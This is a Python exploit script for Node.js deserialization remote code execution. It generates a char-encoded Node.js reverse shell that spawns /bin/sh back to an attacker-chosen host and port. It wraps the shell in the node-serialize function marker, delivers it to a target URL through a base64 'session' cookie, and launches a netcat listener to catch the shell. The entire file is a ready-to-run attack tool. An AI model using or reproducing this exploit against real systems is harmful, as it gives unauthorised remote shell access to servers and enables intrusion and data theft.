#!/usr/bin/python3

#Referer: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
# Generator for encoded NodeJS reverse shells
# Based on the NodeJS reverse shell by Evilpacket
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
# Insecurety Research (2013) - insecurety.net
# https://cyberchef.io/
#Reply : https://www.linkedin.com/in/leandro-henrique-ohms/



import argparse
import requests
import socket
import lxml
import os
from time import sleep
from multiprocessing import Process
from urllib.parse import quote
from bs4 import BeautifulSoup
import base64

class ReverseShellEncoder:
    def __init__(self):
        self.parser = argparse.ArgumentParser(description="Gera um payload de shell reverso NodeJS codificado.")
        self._add_arguments()
        
    def _add_arguments(self):
        self.parser.add_argument('--lhost', type=str, required=True, help='Endereço IP local para conexão reversa')
        self.parser.add_argument('--lport', type=int, required=True, help='Porta local para conexão reversa')
        self.parser.add_argument('--timeout', type=int, default=5, help='Timeout para reconexão (em milissegundos)')
        self.parser.add_argument('--message', type=str, default="Connected!", help='Mensagem de conexão')
        self.parser.add_argument('--url', type=str, required=True, help='URL para enviar o payload via requisição HTTP')
        self.parser.add_argument('--processes', type=int, default=1, help='Número de processos para enviar o payload e escutar conexões')

    def parse_arguments(self):
        self.args = self.parser.parse_args()
        
    def charencode(self, string):
        encoded = ''
        for char in string:
            encoded += "," + str(ord(char))
        return encoded[1:]

    def generate_payload(self):
        nodejs_rev_shell = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (self.args.lhost, self.args.lport)

        print("[+] Encoding")
        encoded_payload = self.charencode(nodejs_rev_shell)
        encoded_payload_str = f"""{{"rce":"_$$ND_FUNC$$_function (){{eval(String.fromCharCode({encoded_payload}))"""+"""}()"}"""
        #print(encoded_payload_str)
        return encoded_payload_str
    
    def encode_url_to_base64(self, url):
        # Encoding URL to bytes
        url_bytes = url.encode('utf-8')
        
        # Encoding bytes to Base64
        base64_encoded = base64.urlsafe_b64encode(url_bytes).decode('utf-8')
        
        return base64_encoded

    def send_payload(self):
        url = self.args.url
        encoded_payload = self.generate_payload()
        evil = self.encode_url_to_base64(encoded_payload)
        cookies = {'session':f'{quote(evil)}'}  # Usando 'session' como o nome do cookie
        headers = {
            'Host': f'{self.args.lhost}:8080',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'If-None-Match': 'W/"1e14-7j5bfO78SSAQEhMm/VhVQdBkgnU"'
        }
        try:
            response = requests.get(url, headers=headers, cookies=cookies, verify=False, allow_redirects=True)
            print(f"[+] Payload sent {cookies}")
            print("Status Code:", response.status_code)
            print("Response Body:", response.text)
        except requests.RequestException as e:
            print("Error sending payload:", e)

    def start_listener(self):
        print(f"[+] Starting listener on port {self.args.lport}")
        os.system(f"rlwrap nc -vlp {self.args.lport}")
        


    def run(self):
        print("[i]Node.js Deserialization Remote Code Execution")
        print("[+] LHOST = %s" % (self.args.lhost))
        print("[+] LPORT = %d" % (self.args.lport))
        print("[+] TIMEOUT = %d" % (self.args.timeout))
        print("[+] MESSAGE = %s" % (self.args.message))

        for i in range(1):

            
            send_process = Process(target=self.send_payload)
            send_process.start()
            
        listen_process = Process(target=self.start_listener)
        listen_process.start()
       
          

if __name__ == "__main__":
    app = ReverseShellEncoder()       
    app.parse_arguments()
    app.run()

